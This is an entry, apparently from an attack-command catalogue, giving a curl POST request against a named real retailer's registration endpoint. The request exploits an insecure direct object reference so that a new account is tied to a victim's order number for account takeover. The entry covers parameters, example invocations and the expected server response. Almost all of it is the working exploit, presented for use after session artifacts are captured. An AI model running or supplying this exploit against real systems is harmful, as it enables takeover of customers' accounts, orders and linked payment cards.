---
id: cmd-curl-register-idor
data: >-
  curl -X POST 'https://theperfumeshop.com/register/forOrder' -H 'Cookie:
  [session-cookies]' -H 'X-CSRF-Token: [csrf-token]' -d
  'orderCode=664448593&email=random@example.com&associateCard=yes&termsCheck=1&dateOfBirth.day=1&dateOfBirth.month=1&dateOfBirth.year=1990&pwd=Password123&checkPwd=Password123'
tags:
  - web
  - exploit
  - post-request
type: command
output: 'HTTP/1.1 302 Found\nLocation: /register/[redacted]serverError'
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:18.225Z'
verified: false
validated: true
submitted: true
---
# curl-post-register-fororder

## Command

```bash
curl -X POST 'https://theperfumeshop.com/register/forOrder' \
  -H 'Cookie: [session-cookies]' \
  -H 'X-CSRF-Token: [csrf-token]' \
  -d 'orderCode=664448593&email=random@example.com&associateCard=yes&termsCheck=1&dateOfBirth.day=1&dateOfBirth.month=1&dateOfBirth.year=1990&pwd=Password123&checkPwd=Password123'
```

## Description

This curl command sends a POST request to exploit the IDOR in the registration endpoint, associating a new account with a victim's order ID to enable takeover. Use it after capturing session artifacts.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `-H 'Cookie: ...'` | Session cookies from guest flow | Yes |
| `-H 'X-CSRF-Token: ...'` | CSRF token to bypass protection | Yes |
| `-d 'orderCode=...'` | Victim's order ID (IDOR parameter) | Yes |
| `-d 'email=...'` | New unregistered email | Yes |
| `-d 'pwd=...&checkPwd=...'` | Password for new account | Yes |
| `-d 'dateOfBirth...'` | DOB fields for validation | Yes |
| `-d 'associateCard=yes'` | Flag to link payments | No |
| `-d 'termsCheck=1'` | Terms acceptance | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://theperfumeshop.com/register/forOrder' -H 'Cookie: JSESSIONID=abc' -H 'X-CSRF-Token: def' -d 'orderCode=664448593&email=test@example.com&pwd=pass&checkPwd=pass&termsCheck=1'
```

### Advanced Usage

Include full DOB and association flags as shown in the main command.

## Expected Output

A 302 redirect with 'Location: /register/[redacted]serverError', indicating backend success in associating the account despite the client-side error.

## Related

- [[Related Procedure: Exploit-IDOR-to-Associate-New-Account-with-Victims-Order]]
